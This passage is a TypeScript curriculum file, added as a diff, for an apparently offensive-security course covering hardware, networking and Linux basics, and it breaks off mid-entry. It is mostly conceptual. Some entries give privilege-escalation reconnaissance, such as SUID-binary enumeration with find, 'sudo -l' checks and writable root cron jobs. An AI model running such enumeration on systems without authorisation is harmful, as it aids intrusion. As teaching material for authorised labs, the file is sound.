@@ -1,0 +1,3462 @@
+import type { Module } from "@/types"
+
+export const CURRICULUM: Module[] = [
+  // ============================================================
+  // M0: Computer Hardware Basics
+  // ============================================================
+  {
+    id: "m0",
+    name: "M0: Computer Hardware Basics",
+    shortName: "Hardware Basics",
+    month: 1,
+    weeks: [1],
+    description:
+      "Foundational hardware knowledge every security professional needs — how a computer's core components work together, from silicon to boot screen. This underpins later topics like buffer overflows, memory forensics, and boot-level attacks (bootkits, Secure Boot bypass).",
+    estimatedHours: 6,
+    outcomes: [
+      "Explain the role of the CPU, RAM, ROM, and storage in a running system",
+      "Distinguish HDD, SSD, and NVMe storage and their security implications",
+      "Describe what BIOS/UEFI do and how Secure Boot protects the boot chain",
+      "Walk through what happens, component by component, from power-on to OS load",
+    ],
+    resources: [
+      { title: "Professor Messer: Hardware Basics", url: "https://www.professormesser.com", type: "video" },
+      { title: "NIST SP 800-12", url: "https://csrc.nist.gov", type: "link" },
+    ],
+    topics: [
+      {
+        id: "m0-1",
+        moduleId: "m0",
+        number: 1,
+        title: "What is a CPU (Central Processing Unit)?",
+        type: "theory",
+        week: 1,
+        description:
+          "The CPU is the computer's 'brain' — it fetches, decodes, and executes instructions one cycle at a time. Understanding it is essential background for buffer overflows and process/CPU-based attacks later in the course.",
+        keyPoints: [
+          "Fetch-decode-execute cycle is the core of CPU operation",
+          "Registers hold data the CPU is actively working on (including the instruction pointer / EIP-RIP)",
+          "Cores and clock speed (GHz) determine how many instructions run per second",
+          "A buffer overflow exploit works by overwriting a return address, hijacking the CPU's instruction pointer",
+        ],
+      },
+      {
+        id: "m0-2",
+        moduleId: "m0",
+        number: 2,
+        title: "RAM vs ROM — Volatile vs Non-Volatile Memory",
+        type: "theory",
+        week: 1,
+        description:
+          "RAM and ROM sit at opposite ends of the volatility spectrum — one is fast but forgets everything on power loss, the other is slow but permanent. This distinction matters directly for memory forensics (RAM dumps) and firmware security (ROM/EEPROM).",
+        keyPoints: [
+          "RAM (volatile): holds data/programs currently in use by the CPU; wiped on power-off",
+          "ROM (non-volatile): retains firmware (e.g. BIOS/UEFI) even without power",
+          "Forensic RAM dumps can recover encryption keys, passwords, and running-process artefacts",
+          "EEPROM (a type of ROM) is why BIOS settings survive a reboot",
+        ],
+      },
+      {
+        id: "m0-3",
+        moduleId: "m0",
+        number: 3,
+        title: "Storage Types: HDD, SSD, NVMe",
+        type: "theory",
+        week: 1,
+        description:
+          "Storage technology has evolved from spinning magnetic platters to solid-state chips connected directly to the CPU bus — each generation trades off speed, cost, and forensic recoverability differently.",
+        keyPoints: [
+          "HDD: spinning magnetic platters, slowest, cheapest per GB, deleted data often recoverable (no true erase)",
+          "SSD: flash memory chips, no moving parts, much faster than HDD, uses TRIM/wear-levelling that complicates forensic recovery",
+          "NVMe: SSD connected directly over PCIe instead of SATA — dramatically higher throughput and lower latency",
+          "Full-disk encryption (BitLocker/LUKS) matters more on SSD/NVMe since deleted data is harder to reliably wipe",
+        ],
+      },
+      {
+        id: "m0-4",
+        moduleId: "m0",
+        number: 4,
+        title: "GPU, Motherboard, BIOS/UEFI Explained",
+        type: "theory",
+        week: 1,
+        description:
+          "BIOS and UEFI are the firmware interfaces that initialise all this hardware and load the OS; UEFI is the modern, more secure replacement for legacy BIOS.",
+        keyPoints: [
+          "GPU: specialised parallel processor for graphics/rendering, also used for password cracking (Hashcat) due to parallelism",
+          "Motherboard: connects CPU, RAM, storage, and peripherals via buses",
+          "BIOS uses MBR partitioning (max ~2TB, 4 primary partitions) with a text-only interface",
+          "UEFI uses GPT partitioning (supports >2TB), has a GUI, and supports Secure Boot",
+          "POST (Power-On Self-Test) checks hardware before the boot loader runs",
+          "Secure Boot blocks unsigned bootloader code — stops bootkits persisting through a reimage",
+        ],
+      },
+      {
+        id: "m0-5",
+        moduleId: "m0",
+        number: 5,
+        title: "How hardware components interact at boot time",
+        type: "theory",
+        week: 1,
+        description:
+          "The boot process is a strict hand-off chain: firmware (BIOS/UEFI) to boot loader to kernel to init system — each stage verifying and launching the next.",
+        keyPoints: [
+          "POST → BIOS/UEFI reads MBR/GPT → boot loader (GRUB / Windows Boot Manager) loads",
+          "Boot loader loads the kernel image into memory; kernel sets up memory management/paging and loads drivers",
+          "Kernel mounts the root filesystem then starts the init process (PID 1)",
+          "Modern Linux uses systemd (targets) instead of legacy SysV init/runlevels",
+        ],
+        terminalCommands: [
+          "dmesg | less",
+          "systemctl get-default",
+          "systemctl list-units --type=service --state=running",
+          "bootrec /fixmbr",
+          "bootrec /rebuildbcd",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M1: Introduction to Cybersecurity
+  // ============================================================
+  {
+    id: "m1",
+    name: "M1: Introduction to Cybersecurity",
+    shortName: "Intro to CyberSec",
+    month: 1,
+    weeks: [1],
+    description:
+      "The conceptual foundation of the entire programme: what cybersecurity actually protects, the three pillars every control maps to, the different specialisations in the field, and the vocabulary you'll hear in every meeting from here on.",
+    estimatedHours: 8,
+    outcomes: [
+      "Define the CIA Triad and map real controls to each pillar",
+      "Distinguish offensive, defensive, and GRC security domains",
+      "Recognise the major attack/threat categories and how they differ",
+      "Use core vocabulary (CVE, CWE, IOC, APT, zero-day, TTP) correctly",
+      "Understand the ethical and legal boundaries of authorised security testing",
+    ],
+    resources: [
+      { title: "TryHackMe Pre-Security Path", url: "https://tryhackme.com", type: "platform" },
+      { title: "cve.mitre.org", url: "https://cve.mitre.org", type: "link" },
+      { title: "MITRE ATT&CK", url: "https://attack.mitre.org", type: "link" },
+    ],
+    topics: [
+      {
+        id: "m1-1",
+        moduleId: "m1",
+        number: 6,
+        title: "What is Cybersecurity and Why It Matters",
+        type: "theory",
+        week: 1,
+        description:
+          "Cybersecurity is the practice of protecting computers, networks, systems, and data from threats, unauthorized access, and attacks — ensuring the confidentiality, integrity, and availability of digital assets.",
+        keyPoints: [
+          "Prevents data breaches that expose personal/business information",
+          "Protects financial transactions from fraud and theft",
+          "Ensures business continuity by preventing disruptive cyberattacks",
+          "Helps organisations comply with regulations (GDPR, ISO 27001)",
+        ],
+      },
+      {
+        id: "m1-2",
+        moduleId: "m1",
+        number: 7,
+        title: "CIA Triad (Confidentiality, Integrity, Availability)",
+        type: "theory",
+        week: 1,
+        description:
+          "The three foundational principles of information security — every security control you'll learn about maps to at least one of these three.",
+        keyPoints: [
+          "Confidentiality: data is accessible only to authorised individuals",
+          "Integrity: data remains accurate and trustworthy (unmodified)",
+          "Availability: data/services remain accessible to legitimate users when needed",
+          "Example: encrypting a file protects Confidentiality; a hash verifies Integrity; a backup ensures Availability",
+        ],
+      },
+      {
+        id: "m1-3",
+        moduleId: "m1",
+        number: 8,
+        title: "Types of Cybersecurity Domains (Offensive, Defensive, GRC)",
+        type: "theory",
+        week: 1,
+        description:
+          "Cybersecurity splits into domains with distinct goals — this course focuses on Offensive Security, but understanding Defensive and GRC gives you the full picture of how a security organisation operates.",
+        keyPoints: [
+          "Offensive Security: simulating attacks to find vulnerabilities before attackers do (pentesting, red teaming, bug bounty)",
+          "Defensive Security: protecting systems/data, patching, and preventing unauthorised access (blue team, SOC)",
+          "GRC (Governance, Risk, Compliance): policies/frameworks, risk assessment, and meeting legal standards (GDPR, ISO 27001, HIPAA)",
+          "Other domains: Cloud Security, Application Security, Network Security, Incident Response, IAM",
+        ],
+      },
+      {
+        id: "m1-4",
+        moduleId: "m1",
+        number: 9,
+        title: "Common Threats & Attack Types (Malware, Phishing, MITM, DDoS, Ransomware)",
+        type: "theory",
+        week: 1,
+        description:
+          "A survey of the attack categories you'll encounter throughout the programme, each of which gets its own deep-dive module later (web attacks in M9/M10, network attacks in M2/M7/M11).",
+        keyPoints: [
+          "Malware: software designed to damage/gain unauthorised access (viruses, worms, trojans, spyware)",
+          "Phishing: deceptive messages tricking users into revealing credentials or installing malware",
+          "MITM (Man-in-the-Middle): intercepting/modifying traffic between two parties, e.g. via ARP spoofing",
+          "DDoS: overwhelming a service with traffic from many sources to make it unavailable",
+          "Ransomware: encrypts victim data and demands payment for the decryption key",
+        ],
+      },
+      {
+        id: "m1-5",
+        moduleId: "m1",
+        number: 10,
+        title: "Key Terms: CVE, CWE, IOC, APT, Zero-Day, Threat Actor, TTP",
+        type: "theory",
+        week: 1,
+        description:
+          "Core vocabulary you'll see constantly in vulnerability reports, threat intel feeds, and pentest reports — get these definitions locked in early. Full definitions with real-world examples are in the Glossary.",
+        keyPoints: [
+          "CVE: unique public ID for a specific known vulnerability (e.g. CVE-2021-44228 = Log4Shell)",
+          "CWE: a class/root-cause of weakness (e.g. CWE-79 = the root cause behind all XSS)",
+          "IOC (Indicator of Compromise): evidence of a breach — suspicious IPs, hashes, registry keys",
+          "APT (Advanced Persistent Threat): a sophisticated, long-term, often state-sponsored attack campaign",
+          "Zero-Day: a vulnerability unknown to the vendor with no patch available",
+          "TTPs: Tactics (goals), Techniques (how), Procedures (specific implementation) describing attacker behaviour",
+        ],
+      },
+      {
+        id: "m1-6",
+        moduleId: "m1",
+        number: 11,
+        title: "Ethical & Legal Boundaries in Security (authorisation, responsible disclosure)",
+        type: "theory",
+        week: 1,
+        description:
+          "Everything in this programme must only ever be practiced against systems you own or are explicitly authorised to test — the single most important rule in offensive security.",
+        keyPoints: [
+          "Always obtain written authorisation before testing any system you don't own (Rules of Engagement)",
+          "Practice exclusively on lab environments: TryHackMe, HackTheBox, PortSwigger Academy, DVWA, VulnMachines",
+          "Responsible disclosure: report vulnerabilities to the vendor/owner before any public disclosure",
+          "Unauthorised access is illegal in most jurisdictions (e.g. Computer Misuse Act, CFAA) regardless of intent",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M2: Networking
+  // ============================================================
+  {
+    id: "m2",
+    name: "M2: Networking",
+    shortName: "Networking",
+    month: 1,
+    weeks: [2],
+    description:
+      "How devices actually talk to each other — from the 7-layer OSI reference model down to the exact packets a firewall inspects. This is the single most load-bearing module for everything that follows: recon, scanning, sniffing, and web attacks all sit on top of this foundation.",
+    estimatedHours: 22,
+    outcomes: [
+      "Explain the OSI and TCP/IP models and map real protocols to each layer",
+      "Read and calculate IPv4 subnets and CIDR notation",
+      "Identify common ports/protocols and the purpose of MAC/ARP",
+      "Differentiate TCP and UDP and when each is used",
+      "Explain what a firewall, VPN, proxy, and NAT actually do to traffic",
+      "Capture and interpret live traffic in Wireshark",
+    ],
+    resources: [
+      { title: "TryHackMe Networking Fundamentals", url: "https://tryhackme.com", type: "platform" },
+      { title: "Professor Messer Networking", url: "https://www.professormesser.com", type: "video" },
+      { title: "Wireshark", url: "https://www.wireshark.org", type: "tool" },
+    ],
+    topics: [
+      {
+        id: "m2-1",
+        moduleId: "m2",
+        number: 12,
+        title: "OSI Model — All 7 Layers Explained",
+        type: "theory",
+        week: 2,
+        description:
+          "A 7-layer conceptual framework describing how data moves across a network — theoretical, but essential vocabulary: Wireshark captures at Layer 2/3, XSS is a Layer 7 attack, a WAF defends at Layer 7.",
+        keyPoints: [
+          "L1 Physical (cables/signals) → L2 Data Link (MAC/switches) → L3 Network (IP/routers) → L4 Transport (TCP/UDP)",
+          "L5 Session (connection mgmt) → L6 Presentation (encryption/encoding) → L7 Application (HTTP, DNS, the actual app)",
+          "'TCP/IP is the actual engine; OSI is the blueprint/manual' — in practice, the real world runs on TCP/IP's 4 layers",
+          "Security tools map cleanly to layers: Wireshark (L2/L3), firewalls (L3/L4), WAF (L7)",
+        ],
+      },
+      {
+        id: "m2-2",
+        moduleId: "m2",
+        number: 13,
+        title: "TCP/IP Model",
+        type: "theory",
+        week: 2,
+        description:
+          "TCP/IP defines how devices actually transmit data across real networks — it has 4 layers versus the OSI model's 7, and it's what every network you'll test actually runs on.",
+        keyPoints: [
+          "Layers: Application (HTTP/FTP/SMTP) → Transport (TCP/UDP) → Internet (IP/ICMP) → Network Access (Ethernet/Wi-Fi)",
+          "TCP = reliable, ordered, error-checked delivery; IP = addressing and routing of packets",
+          "Key features: scalability, interoperability, routability (OSPF, BGP), modularity",
+          "'In the real world we use TCP/IP, not OSI — OSI is theoretical'",
+        ],
+      },
+      {
+        id: "m2-3",
+        moduleId: "m2",
+        number: 14,
+        title: "IP Addressing (IPv4, IPv6) & Subnetting",
+        type: "theory",
+        week: 2,
+        description:
+          "Every device on a network needs an address — subnetting is how you divide one address space into smaller, manageable, isolated networks.",
+        keyPoints: [
+          "IPv4: 32-bit address (e.g. 192.168.1.10), written as 4 octets",
+          "IPv6: 128-bit address, designed to solve IPv4 exhaustion (e.g. 2001:db8::1)",
+          "CIDR notation (e.g. /24) defines how many bits are the network portion vs host portion",
+          "A /24 network (255.255.255.0) gives 256 addresses (254 usable hosts)",
+          "Subnetting isolates traffic, reduces broadcast domains, and enables per-segment security policy",
+        ],
+      },
+      {
+        id: "m2-4",
+        moduleId: "m2",
+        number: 15,
+        title: "Ports & Common Protocols (DNS, HTTP/S, FTP, SSH, SMTP, RDP)",
+        type: "theory",
+        week: 2,
+        description:
+          "Rules and conventions enabling device communication — every service you'll ever scan or exploit is identified first by its port and protocol.",
+        keyPoints: [
+          "HTTP (80) / HTTPS (443, TLS-encrypted): web traffic",
+          "DNS (53): domain-name-to-IP resolution — the 'phone book' of the internet",
+          "FTP (21), SSH (22, secure remote admin), SMTP (25, mail sending), RDP (3389, Windows remote desktop)",
+          "Security protocols: SSL/TLS, IPSec; management protocols: SNMP, ICMP (used by ping)",
+          "TCP-based services (reliable, e.g. email/downloads) vs UDP-based (fast, e.g. DNS queries/streaming)",
+        ],
+        terminalCommands: ["ping google.com", "curl -I https://example.com"],
+      },
+      {
+        id: "m2-5",
+        moduleId: "m2",
+        number: 16,
+        title: "MAC Address & ARP",
+        type: "theory",
+        week: 2,
+        description:
+          "ARP maps an IP address to a MAC address on the local network segment (Layer 2) — think of it like looking up a house's exact door number using its street address.",
+        keyPoints: [
+          "ARP process: check ARP cache → broadcast ARP Request → receive unicast ARP Reply → update cache",
+          "Types: Dynamic ARP, Static ARP, Proxy ARP, Gratuitous ARP (GARP)",
+          "ARP Spoofing/Poisoning: attacker maps their own MAC to a legitimate IP, enabling MITM attacks",
+          "MAC addresses operate only within a local network segment; routers use IP for anything beyond it",
+        ],
+        terminalCommands: ["arp -a", "arp -n"],
+      },
+      {
+        id: "m2-6",
+        moduleId: "m2",
+        number: 17,
+        title: "TCP vs UDP — Differences & Use Cases",
+        type: "theory",
+        week: 2,
+        description:
+          "The two transport-layer protocols trade reliability for speed differently — knowing which a service uses shapes how you scan and exploit it.",
+        keyPoints: [
+          "TCP: connection-oriented, reliable, in-order delivery (3-way handshake) — used for downloads, email, streaming",
+          "UDP: connectionless, faster, no delivery guarantee — used for gaming, video calls, live streaming, DNS",
+          "Nmap treats TCP and UDP scans very differently (-sS vs -sU) — UDP scanning is much slower",
+        ],
+      },
+      {
+        id: "m2-7",
+        moduleId: "m2",
+        number: 18,
+        title: "Switches, Routers, Hubs - Differences",
+        type: "theory",
+        week: 2,
+        description:
+          "Three core connectivity devices with increasing intelligence — a hub is a dumb broadcaster, a switch forwards by MAC address, a router connects networks by IP.",
+        keyPoints: [
+          "Hub (L1): broadcasts to every port, no intelligence, low security — largely obsolete",
+          "Switch (L2): forwards frames based on MAC address table, moderate security",
+          "Router (L3): routes packets between networks based on IP, highest security controls (ACLs)",
+          "Switch types: Unmanaged, Managed, Layer 2, Layer 3 (can route)",
+        ],
+      },
+      {
+        id: "m2-8",
+        moduleId: "m2",
+        number: 19,
+        title: "Firewall Basics (packet filter, stateful, NGFW)",
+        type: "theory",
+        week: 2,
+        description:
+          "A firewall monitors and controls incoming/outgoing traffic against a defined rule set — the network's security guard.",
+        keyPoints: [
+          "Packet-Filtering: rules by IP/port/protocol only (Layer 3/4)",
+          "Stateful Inspection: tracks connection state and session context",
+          "Proxy/Application-Layer Firewall: Layer 7 intermediary, masks internal IPs",
+          "NGFW (Next-Gen): combines deep packet inspection + IPS + application awareness, inspects HTTPS traffic",
+          "Protects against unauthorised access, malware, data breaches, and DoS attacks",
+        ],
+        terminalCommands: [
+          "iptables -L",
+          "sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
+        ],
+      },
+      {
+        id: "m2-9",
+        moduleId: "m2",
+        number: 20,
+        title: "VPN & Proxies",
+        type: "theory",
+        week: 2,
+        description:
+          "Both mask your IP and can improve privacy, but they work very differently — a proxy is a simple middleman, a VPN is a fully encrypted tunnel for all traffic.",
+        keyPoints: [
+          "Proxy types: HTTP, HTTPS, SOCKS, Transparent, Reverse, Anonymous, Elite — typically not encrypted",
+          "VPN types: Remote Access, Site-to-Site, SSL/TLS, IPSec, MPLS, Cloud VPN — encrypts all traffic",
+          "VPN is slower (encryption overhead) but protects traffic on untrusted networks like public Wi-Fi",
+          "TryHackMe and HackTheBox both require a VPN connection to reach their lab networks",
+        ],
+      },
+      {
+        id: "m2-10",
+        moduleId: "m2",
+        number: 21,
+        title: "NAT (Network Address Translation)",
+        type: "theory",
+        week: 2,
+        description:
+          "NAT translates private internal IP addresses to a single public IP for internet-bound traffic, conserving scarce public IPv4 addresses.",
+        keyPoints: [
+          "Private-to-public IP translation lets many internal devices share one public IP",
+          "Conserves IPv4 address space and hides internal network structure from the internet",
+          "Complicates inbound connections — port forwarding is required to reach an internal service from outside",
+        ],
+      },
+      {
+        id: "m2-11",
+        moduleId: "m2",
+        number: 22,
+        title: "What Happens When You Type a URL and Hit Enter (full flow)",
+        type: "theory",
+        week: 2,
+        description:
+          "A classic interview question that ties every networking concept in this module together into one end-to-end flow.",
+        keyPoints: [
+          "Browser checks cache → DNS resolution (domain → IP) via resolver/root/TLD/authoritative servers",
+          "TCP 3-way handshake (SYN, SYN-ACK, ACK) establishes a connection to the server's IP on port 443",
+          "TLS handshake negotiates encryption; browser sends the HTTP request over the encrypted channel",
+          "Server processes the request (app logic, DB queries) and returns an HTTP response",
+          "Browser parses HTML/CSS/JS and renders the page, firing further requests for assets",
+        ],
+      },
+      {
+        id: "m2-12",
+        moduleId: "m2",
+        number: 23,
+        title: "Wireshark Lab - Capture & Label Traffic by OSI Layer",
+        type: "lab",
+        week: 2,
+        description:
+          "Hands-on packet capture and analysis lab — capture live traffic and identify protocols at each OSI layer using Wireshark's Statistics and Follow-Stream views.",
+        keyPoints: [
+          "Packets on a network are visible to anyone listening; HTTPS is encrypted, FTP/HTTP are not",
+          "Statistics view shows source/destination IP and protocol breakdown — flag any unknown/suspicious IPs",
+          "Right-click a packet → Follow → TCP Stream to view the full request/response conversation",
+          "Look for the 3-way TCP handshake followed by an application-layer request (e.g. HTTP GET)",
+        ],
+      },
+      {
+        id: "m2-13",
+        moduleId: "m2",
+        number: 24,
+        title: "Subnetting Practice Exercise (5 CIDRs)",
+        type: "exercise",
+        week: 2,
+        description:
+          "Manual subnet-math practice — calculate network address, broadcast address, and usable host range for 5 given CIDR blocks without a calculator first.",
+        keyPoints: [
+          "For any /n, host bits = 32 - n, total addresses = 2^(host bits)",
+          "Network address = first address in the block; broadcast = last address in the block",
+          "Usable hosts = total addresses - 2 (network + broadcast reserved)",
+          "Practice going both directions: CIDR → range, and range → CIDR",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M3: OS Basics — Linux
+  // ============================================================
+  {
+    id: "m3-linux",
+    name: "M3: OS Basics - Linux",
+    shortName: "Linux Basics",
+    month: 1,
+    weeks: [3],
+    description:
+      "Linux is the operating system behind most servers, cloud infrastructure, and every major pentesting distro (Kali). This module builds real command-line fluency — navigation, permissions, processes, and networking — that every later lab assumes you already have.",
+    estimatedHours: 22,
+    outcomes: [
+      "Navigate the Linux filesystem and manage files/directories confidently from the shell",
+      "Read and modify permissions, including SUID/SGID/sticky-bit security implications",
+      "Manage processes, services, users, and groups from the command line",
+      "Use pipes, redirection, and core text tools (grep/sed/awk) to chain commands",
+      "Capture traffic and manage firewall rules with tcpdump/iptables",
+    ],
+    resources: [
+      { title: "OverTheWire Bandit", url: "https://overthewire.org/wargames/bandit/", type: "platform" },
+      { title: "explainshell.com", url: "https://explainshell.com", type: "tool" },
+      { title: "TryHackMe Linux Fundamentals", url: "https://tryhackme.com", type: "platform" },
+    ],
+    topics: [
+      {
+        id: "m3-linux-1",
+        moduleId: "m3-linux",
+        number: 25,
+        title: "Linux Overview - Distros, Philosophy, Use in Security",
+        type: "theory",
+        week: 3,
+        description:
+          "Linux is a family of open-source operating systems built on the Linux kernel (created by Linus Torvalds, released 17 Sept 1991) due to a lack of a free kernel for the GNU project.",
+        keyPoints: [
+          "A distro = kernel + software + package manager, e.g. Kali (pentesting, XFCE), Mint (beginner-friendly), Ubuntu (Debian-derived, servers), Arch (minimal, fully customisable)",
+          "Used across servers, cloud, IoT, and Android — considered more secure and customisable than Windows for these use cases",
+          "Kali Linux ships pre-loaded with the pentesting tools used throughout this programme (Nmap, Burp, Metasploit, Hashcat)",
+        ],
+        terminalCommands: ["tree / -L 1"],
+      },
+      {
+        id: "m3-linux-2",
+        moduleId: "m3-linux",
+        number: 26,
+        title: "Linux File System Hierarchy (/bin, /etc, /var, /home, /tmp)",
+        type: "theory",
+        week: 3,
+        description:
+          "Linux uses a single rooted tree (/) rather than separate drive letters like Windows — other drives are 'mounted' into this one tree.",
+        keyPoints: [
+          "/bin: system binaries (bash, ls, cat) — /etc: config files — /home: user home directories",
+          "/var: variable/frequently-changing data (logs) — /tmp: temporary files, cleared on reboot",
+          "/root: root user's home — /usr: non-critical user binaries/libraries — /opt: third-party software",
+          "/dev: device files — /media, /mnt: removable/temporary mount points",
+        ],
+        terminalCommands: ["tree / -L 1", "ls -la /"],
+      },
+      {
+        id: "m3-linux-3",
+        moduleId: "m3-linux",
+        number: 27,
+        title: "File Navigation & Management (ls, cd, cp, mv, rm, find, locate, mkdir)",
+        type: "theory",
+        week: 3,
+        description:
+          "The core commands you'll type hundreds of times a day — the shell prompt format is user@host:current_dir$, where ~ means your home directory.",
+        keyPoints: [
+          "'.' = current directory, '..' = parent directory",
+          "Absolute paths start from / ; relative paths are resolved from your current directory",
+          "find searches the live filesystem by criteria; locate uses a prebuilt index (faster, can be stale)",
+        ],
+        terminalCommands: [
+          "pwd",
+          "cd ~",
+          "cd ..",
+          "ls -la [dir]",
+          "touch file",
+          "mkdir dir",
+          "rm -r dir",
+          "mv src dest",
+          "cp src dest",
+          "find / -type f -name index.html",
+          "locate index.html",
+          "which nmap",
+        ],
+      },
+      {
+        id: "m3-linux-4",
+        moduleId: "m3-linux",
+        number: 28,
+        title: "Standard I/O, Pipes & Redirection (|, >, >>, tee, grep, sed, awk)",
+        type: "theory",
+        week: 3,
+        description:
+          "Linux I/O uses 3 standard streams — stdin(0), stdout(1), stderr(2). Redirection sends stream data to/from files; pipes chain one program's output into another's input.",
+        keyPoints: [
+          "> overwrites stdout, >> appends stdout, 2> redirects stderr, < feeds stdin from a file",
+          "/dev/null is a special discard file for suppressing unwanted output",
+          "Pipes chain commands: command1 | command2 | command3",
+          "tee writes to the terminal AND a file simultaneously — useful for logging a live scan",
+        ],
+        terminalCommands: [
+          'echo "Hello World!" > hello.txt',
+          'echo "more text" >> hello.txt',
+          "ls /home /root 2>/dev/null",
+          "cat /proc/meminfo | grep MemFree",
+          "ping google.com | tee ping.log",
+        ],
+      },
+      {
+        id: "m3-linux-5",
+        moduleId: "m3-linux",
+        number: 29,
+        title: "File Permissions (chmod, chown, chgrp, SUID, SGID, Sticky Bit)",
+        type: "theory",
+        week: 3,
+        description:
+          "Every file/directory has owner/group/other permission triads (viewable via ls -l) — misconfigured permissions, especially SUID binaries, are a classic Linux privilege-escalation vector.",
+        keyPoints: [
+          "Octal notation: 4=read, 2=write, 1=execute (sum to combine), e.g. chmod 700 file, chmod 744 file",
+          "Permission table: 0=--- 1=--x 2=-w- 3=-wx 4=r-- 5=r-x 6=rw- 7=rwx",
+          "SUID (chmod u+s / 4xxx): binary runs as its owner regardless of who executes it",
+          "SGID (chmod g+s / 2xxx): binary/directory runs as/inherits its owning group",
+          "Sticky bit (chmod +t / 1xxx): restricts delete/rename to the file's owner or root (used on /tmp)",
+        ],
+        terminalCommands: [
+          "ls -l",
+          "chown user file",
+          "chgrp group file",
+          "chmod u+x file",
+          "chmod 700 file",
+          "find / -perm -4000 -type f 2>/dev/null",
+        ],
+      },
+      {
+        id: "m3-linux-6",
+        moduleId: "m3-linux",
+        number: 30,
+        title: "Man Pages & Help System",
+        type: "theory",
+        week: 3,
+        description:
+          "Built-in documentation for every command via man — indispensable when you hit an unfamiliar flag mid-engagement.",
+        keyPoints: [
+          "Man sections: 1=commands, 2=syscalls, 3=library calls, 5=file formats (e.g. /etc/passwd), 8=sysadmin",
+          "man 1 passwd = the passwd command; man 5 passwd = the /etc/passwd file format",
+          "Inside man: / then a term to search, n/N for next/previous match, q to quit",
+        ],
+        terminalCommands: ["man man", "man 5 passwd", "man -k network"],
+      },
+      {
+        id: "m3-linux-7",
+        moduleId: "m3-linux",
+        number: 31,
+        title: "Process Management (ps, top, htop, kill, bg, fg, nohup)",
+        type: "theory",
+        week: 3,
+        description:
+          "ps (process status) lists running processes with their PID — the identifier you need to inspect, background, or kill any running program.",
+        keyPoints: [
+          "ps -aux (BSD syntax) vs ps -ef (Standard syntax) — both list all running processes",
+          "Ctrl+C sends an interrupt; Ctrl+Z suspends a process — fg resumes it in the foreground, bg in the background",
+          "Trailing & backgrounds a command immediately; $? holds the last command's exit code",
+        ],
+        terminalCommands: [
+          "ps aux",
+          "ps -ef | grep sshd",
+          "kill <PID>",
+          "top",
+          "htop",
+          "nohup long_command &",
+        ],
+      },
+      {
+        id: "m3-linux-8",
+        moduleId: "m3-linux",
+        number: 32,
+        title: "User & Group Management (adduser, passwd, sudo, su, groups, id)",
+        type: "theory",
+        week: 3,
+        description:
+          "Every user has a username and one or more groups, which drive permission and access-control decisions system-wide.",
+        keyPoints: [
+          "root = UID/GID 0; sudo -l shows what a user is allowed to run as root (a key privesc check)",
+          "/etc/passwd stores user metadata (7 fields: username, x, UID, GID, GECOS, home dir, shell); real hashes live in root-only /etc/shadow",
+          "adduser (interactive, friendlier) vs useradd -m -s /bin/bash (low-level, scriptable)",
+          "usermod -aG sudo user adds a user to the sudo group without removing existing groups",
+        ],
+        terminalCommands: [
+          "whoami",
+          "id",
+          "sudo -l",
+          "adduser newuser",
+          "usermod -aG sudo newuser",
+          "passwd newuser",
+          "groups newuser",
+        ],
+      },
+      {
+        id: "m3-linux-9",
+        moduleId: "m3-linux",
+        number: 33,
+        title: "Starting & Stopping Services (systemctl, service)",
+        type: "theory",
+        week: 3,
+        description:
+          "systemd (PID 1, the init process) replaced legacy SysV init scripts on modern distros — systemctl is how you check, start, stop, and persist services.",
+        keyPoints: [
+          "systemctl status <service> shows Loaded/Active/Main PID at a glance",
+          "'start' runs a service now only; 'enable' makes it persist across reboots — they are not the same",
+        ],
+        terminalCommands: [
+          "sudo systemctl status sshd",
+          "sudo systemctl stop sshd",
+          "sudo systemctl start sshd",
+          "sudo systemctl enable sshd",
+        ],
+      },
+      {
+        id: "m3-linux-10",
+        moduleId: "m3-linux",
+        number: 34,
+        title: "Network Commands (ifconfig/ip, netstat, ss, tcpdump, iptables)",
+        type: "theory",
+        week: 3,
+        description:
+          "The commands that show you what a Linux box can see and reach on the network — interface config, active connections, live packet capture, and firewall rules.",
+        keyPoints: [
+          "ip a (modern) has replaced ifconfig (legacy) for showing interfaces and assigned IPs",
+          "netstat -tulpn / ss -tulpn show listening ports and established connections",
+          "tcpdump captures live traffic; -w saves to a .pcap file for later Wireshark analysis",
+          "iptables filters traffic via Tables, Chains, Rules, and Targets",
+        ],
+        terminalCommands: [
+          "ip a",
+          "netstat -tulpn",
+          "ss -tulpn",
+          "sudo tcpdump -i any -c 1000 -w capture.pcap",
+          "iptables -L",
+        ],
+      },
+      {
+        id: "m3-linux-11",
+        moduleId: "m3-linux",
+        number: 35,
+        title: "Package Management (apt, apt-get, dpkg, yum/dnf)",
+        type: "theory",
+        week: 3,
+        description:
+          "Debian-based distros (Kali, Ubuntu, Mint) use APT/dpkg; Red Hat-based distros use YUM/DNF — knowing both lets you install tools on any target you're given lab access to.",
+        keyPoints: [
+          "apt update refreshes the package index; apt upgrade installs newer versions of installed packages",
+          "apt install <pkg> installs a new tool; dpkg -i installs a local .deb file directly",
+          "yum/dnf are the RPM-based equivalents on CentOS/Fedora/RHEL",
+        ],
+        terminalCommands: [
+          "sudo apt update && sudo apt upgrade",
+          "sudo apt install nmap",
+          "sudo dpkg -i package.deb",
+          "sudo dnf install nmap",
+        ],
+      },
+      {
+        id: "m3-linux-12",
+        moduleId: "m3-linux",
+        number: 36,
+        title: "SSH & Remote Access (ssh, scp, ssh-keygen)",
+        type: "theory",
+        week: 3,
+        description:
+          "SSH provides secure, encrypted remote access to servers — system administrators (and pentesters, post-exploitation) use it to remotely manage or pivot through machines.",
+        keyPoints: [
+          "Password auth vs key-based auth (ssh-keygen generates a keypair; public key goes in ~/.ssh/authorized_keys)",
+          "scp copies files securely over SSH, using the same syntax style as cp but with a host prefix",
+          "SSH is the standard target for Hydra/Medusa brute-force testing labs later in the course",
+        ],
+        terminalCommands: [
+          "ssh user@10.10.10.5",
+          "ssh-keygen -t ed25519",
+          "scp file.txt user@10.10.10.5:/tmp/",
+        ],
+      },
+      {
+        id: "m3-linux-13",
+        moduleId: "m3-linux",
+        number: 37,
+        title: "Cron Jobs & Task Automation (crontab -e)",
+        type: "theory",
+        week: 3,
+        description:
+          "Cron schedules commands to run automatically at fixed times/intervals — and a world-writable cron script run as root is a classic Linux privilege-escalation path covered again in M11.",
+        keyPoints: [
+          "Crontab format: minute hour day month weekday command",
+          "System-wide jobs live in /etc/crontab and /etc/cron.d/; user jobs via crontab -e",
